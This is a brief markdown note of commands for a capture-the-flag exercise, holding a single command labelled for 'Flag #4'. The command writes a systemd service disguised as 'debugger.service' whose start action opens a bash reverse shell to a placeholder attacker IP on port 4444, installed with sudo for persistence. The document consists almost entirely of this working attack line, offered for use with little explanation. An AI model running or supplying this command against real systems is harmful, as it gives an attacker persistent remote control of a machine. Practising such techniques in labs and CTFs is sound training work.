# Some helpful commands for the CTF

### Reverse Shell for Flag #4
```
echo "[Service]\nExecStart=/bin/bash -c '/bin/bash -i >& /dev/tcp/[Your.IP.Address]/4444 0>&1'" | sudo tee /lib/systemd/system/debugger.service > /dev/null
```
